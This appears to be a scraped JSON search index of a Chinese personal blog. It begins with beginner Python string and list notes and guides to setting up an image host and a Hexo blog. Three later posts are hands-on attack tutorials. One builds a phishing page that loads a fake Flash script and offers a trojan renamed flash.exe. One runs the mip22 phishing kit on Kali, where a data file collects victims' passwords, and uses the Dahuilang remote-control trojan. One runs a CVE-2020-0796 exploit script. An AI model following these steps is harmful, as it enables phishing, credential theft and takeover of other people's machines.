n.lower() # i have a dream （四）、字符串的切割和替换 字符串strip() strip()去掉字符串左右两端的空白符（空格,\\t,\\n）。一般用于账户登录，避免用户在两端打出空格无法分辨 123s = &quot; 你好！ 我已经躲起 来了 &quot;s1 = s.strip()print(s1) #会输出：你好！ 我已经躲起来 来了 字符串的替换replace(old,mew) 1234567s = &quot;你好啊，我叫abc&quot;s1 = s.repalce(abc,xyz)print(s1) #输出：你好啊，我叫xyz#去掉所有空格a = &quot; x x xx x &quot;a1 = a.replace(&quot; &quot;,&quot;&quot;)print(a1) #输出：xxxxx 字符串的切割 split(str) 字符串切割 12345a = &quot;python_java_c_c#_javascript&quot;lst = a.split(_) #切割之后的结果会放在列表当中print(lst) #输出：[&#x27;python&#x27;,&quot;java&quot;,&#x27;c&#x27;,&#x27;c#&#x27;,&#x27;javascript&#x27;]lst = a.split(&quot;_java_&quot;)print(lst) #输出：[&#x27;python&#x27;,&#x27;c_c#_javascript&#x27;] （五）字符串的查找和判断 查找 find(str,beg&#x3D;0，end&#x3D;len(string)) 只查找第一次出现的位置 str–指定索引字符串 beg–开始索引，默认为0 end–结束索引，默认为字符串长度 如果包含子字符串返回开始的索引值，否则返回-1,即不包含寻找的str字符串 123s = &quot;你好啊，我叫周润发&quot;ret = s.find(&quot;周润发&quot;)print(ret) 判断 in用于该字符串是否存在（以及for循环的条件判断） * (返回值为 ture or false) 12s = &quot;你好啊，我叫周润发&quot;print(&quot;周润发111&quot; in s) startswith()用于判断字符串是否以xxx开头 * endswith()用于判断字符串是否以xxx结尾 isdight()用于判断字符串是否由整数组成 * （六）、字符串补充与总结 字符串拼接-join() 123lst = [&quot;123&quot;,&quot;456&quot;,&quot;789&quot;]s = &quot;_&quot;join(lst) print(s) #输出：123_456_789（输出的s是字符串类型） 总结 f“{变量}” 格式化一个字符串 索引和切片： 索引：从0开始的 [] 切片：s[start:end:step] end位置数据永远取不到 相关操作： 字符串操作对原字符串是不发生改变的 upper()在需要忽略大小写的时候 strip()去掉字符串左右两端的空白（空格，\\t,\\n） replace(old,new) 字符串替换 split() 对字符串进行切割 &quot;(用什么拼接)&quot;join(列表) 拼接一个列表中的内容成为新字符串 startswith(xxx) 判断字符串是否以xxx开头 len() 字符串长度（内置函数） 字符串的循环和遍历 12for c in s: print(c) 字符串的每一个字符 关于in 判断xxx是否在xxxxxx中出现 for循环 三、列表（一）、列表的概念 定义：能装东西的东西(什么都能装，字符串、列表、字典、元组等) 在python中用[]来表示一个列表 特性： 也像字符串一样有索引和切片 12lst = [&#x27;123&#x27;,&#x27;zzz&#x27;,123] print(lst[]) 索引如果超过范围会报错 可以用for循环进行遍历 12for item in lst: print(item) （二）、列表的增删改查 增 append() 追加（在末尾添加，只能添加一个元素） insert() 插入 extend() 可以合并两个列表 删除 pop() 给出被删除的索引，返回被删除的元素 remove() 删除某个元素 修改 直接用索引进行修改 lst[x] = &quot;xx&quot; 查询 直接用索引进行查询操作 print(lst[x])","path":"2023/12/03/Python_study/","date":"12-03","excerpt":"","tags":[]},{"title":"图床搭建","text":"下载并安装node.js 下载并安装PicGo typora-偏好设置 进入GitHub，点击右上角头像，点击your repositories,点击new创建新库 点击右上角头像，点击setting→developer setting→personal 创建ssh picgo的GitHub设置 上传前将picgo设置为时间戳重命名 设置完成后进入typora偏好设置，点击验证图片上传","path":"2023/12/03/tuchuang/","date":"12-03","excerpt":"","tags":[]},{"title":"python安装","text":"进入192.168.2.6：5244搜索python，或者进入python官网下载python（需要和电脑版本一致的版本，右键计算机-属性查看） 安装python 打开安装包，勾选add python 3.8 to PATH,点击Customize installation进入下一页 全选，点击next 勾选add python to environmnet variables,选择安装路径（默认c盘）,点击install 测试python是否能调用 在python文件夹下，输入cmd 进入命令行，输入python 出现以下界面则安装成功","path":"2023/12/03/python/","date":"12-03","excerpt":"","tags":[]},{"title":"利用github搭博客","text":"准备前提 提前安装好(node.js)[https://nodejs.org/en] 左边的那个 提前安装好(GIt)[https://git-scm.com/downloads] 提前注册好一个github账号 如果文章图片没有显示，请自行挂代理 操作步骤 在本地找个目录放博客 在选定的目录下，右键Git Bash Here 使用nmp命令安装hexo，输入：1234npm install -g hexo-clihexo init blogcd bloghexo g 构建好的效果图 cd 进入这个目录 为了检测我们的网站雏形，分别按顺序输入以下三条命令： 1234hexo new test_my_sitehexo ghexo s#之后就可以访问127.0.0.1:4000访问blog了 配置ssh (1) cd~/.ssh检查本机已存在的ssh密钥如果提示：No such file or directory 说明你是第一次使用git。(2) ssh-keygen -t rsa -C “邮件地址”然后连续3次回车，最终会生成一个文件在用户目录下(3) 打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：(4) key填写C:\\Users\\Administrator.ssh\\id_rsa.pub中的内容(5) 尝试ssh连接,测试是否成功ssh -T [git@github.com](mailto:git@github.com) # 注意邮箱地址不用改(6) 如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功： (7) 在选中的位置(blog目录下)打开cmd(以管理员身份) npm install hexo-deployer-git –save (8) 在上一个Git Bash Here还需要继续配置 12git config --global user.name “guangfa29”// 你的github用户名，非昵称git config --global user.email “1814124180@qq.com“// 填写你的github注册邮箱 准备上传代码 (1) github上新建一个存储库，命名为guangfa29(用户名).github.io (2) 编辑_config.yml文件，在最后改成这样 12345deploy:type: gitrepository: git@github.com:guangfa29/guangfa29.github.io.gitbranch: main#后三行需隔开一个tab的位置 (3) 注意保持格式，缩进不对，会导致一会儿，上传不成功 (4) 最后输入hexo d上传 (5) 在创建的存储库的设置中-pages-如图设置 hexo命令介绍12345678910111213141516hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令hexo version #查看Hexo的版本hexo generate #生成静态页面至public目录hexo s -g #生成并本地预览hexo d -g #生成并上传","path":"2023/12/03/daboke/","date":"12-03","excerpt":"","tags":[]},{"title":"钓鱼页面优化","text":"打开虚拟机安装phpstudy 打开phpstudy，启动Apache 点击网站，点击管理，打开根目录,删除www文件夹里文件 新建文本文档，改为index.html后缀 打开vscode（可在物理机中，在桌面新建文件夹，在文件夹下新建文本文档改为index.html）,通过vscode打开这个文件夹 输入 ！ 按tab键 在body输入&lt;h1&gt;……&lt;/h1&gt; 将代码复制到虚拟机index.html（以记事本打开） 打开浏览器，输入127.0.0.1，可看见输入内容以网页方式 在body后面插入&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt; 将整个代码复制如上步骤打开浏览器 下载flash文件（微信文件）放在虚拟机中www文件下，文件名改名为flash.js 右键点击flash点击编辑 将http后面改成自己的ip地址（php所在电脑），点击保存 如果不能保存，则在桌面新建文本文档改为flash.js 右键编辑复制进去，再放入www文件夹下 将木马程序改为flash.exe放在www文件夹下","path":"2023/12/03/diaoyuyemianyouhua/","date":"12-03","excerpt":"","tags":[]},{"title":"kali的钓鱼网站制作及大灰狼使用","text":"钓鱼网站的制作 下载kali（预留30g) 打开虚拟机kali 代码操作1234567891011121314151617输入 vim /etc/[proxychains4.conf](http://proxychains4.conf)一直按下↓最后一行 socks…… （打开猫→允许局域网打开→找到ipv4）改成 socks5 ip地址 port（端口）按Esc进入命令模式 按i进入插入模式 切忌使用Ctrl z，不用鼠标，在插入模式可用鼠标粘贴复制输入：wq！（保存）输入：q！（不保存退出）输入 proxychains4 git clone https://github.com/makdosx/mip22输入 ls（确认有mip22）输入 cd mip22输入 chmod +x ./*输入 proxychains4 -q bash ./[mip22.sh](http://mip22.sh)输入 1（出现有69种样板选一个）输入（所选择数字）输入 3 选择https网址复制，可看到访客记录（Ctrl c 终止程序） 返回桌面下mip22文件下data是密码，finger是访问地址 远程遥控 访问192.168.2:2544搜索下载大灰狼 查看物理机ipv4，在大灰狼中生成服务，将生成程序放入虚拟机中，即可通过大灰狼实现远程遥控等操作。","path":"2023/12/02/11.28/","date":"12-02","excerpt":"","tags":[]},{"title":"永恒之黑","text":"下载（微信文件）VMware安装虚拟机 下载（微信文件）CVE文件 查看虚拟机ipv4，将CVE文件在终端打开 执行代码 123python .\\CVE-2020-0796.py ipv4 #虚拟机pip3 install xxx -i http://mirrors.aliyun.com/pypi/simple/--trusted-host mirrors.aliyun.com #当缺少xxx文件时会提示,xxx文件后面字段可加速下载#当缺少文件时需重复上两段代码，直至第一段代码能成功运行","path":"2023/12/02/11.27/","date":"12-02","excerpt":"","tags":[]}],"categories":[],"tags":[]}